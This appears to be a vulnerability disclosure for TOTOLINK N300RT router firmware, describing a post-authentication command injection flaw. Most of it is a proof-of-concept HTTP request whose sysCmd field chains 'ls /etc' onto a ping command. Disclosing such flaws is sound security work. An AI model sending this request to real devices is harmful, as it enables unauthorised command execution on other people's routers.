## TOTOLINK-N300RT
Product:TOTOLINK-N300RT
Firmware Version: TOTOLINK-N300RT  V3.2.4-B20180730.0906
Manufacturer's website information：http://www.totolink.cn/

### description
TOTOLINK-N300RT has a post-auth rce due to the incorrect access control vulnerability, attackers can bypass front-end security restrictions by using burpsuite or smth like that

POC：
```
POST /boafrm/formSysCmd HTTP/1.1
Host: 192.168.1.1:80
Content-Length: 101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.1:80
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0
Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,ima
ge/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/syscmd.htm
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
sysCmdselect=5&sysCmdselects=0&apply=Run+Command&sysCmd=p
ing+8.8.8.8;ls /etc&submit-url=%2Fsyscmd.htm&msg=
```

video:

https://github.com/xieqiang11/security_research/assets/149745918/471c1696-2a8f-4640-b739-cef4b9d3d516
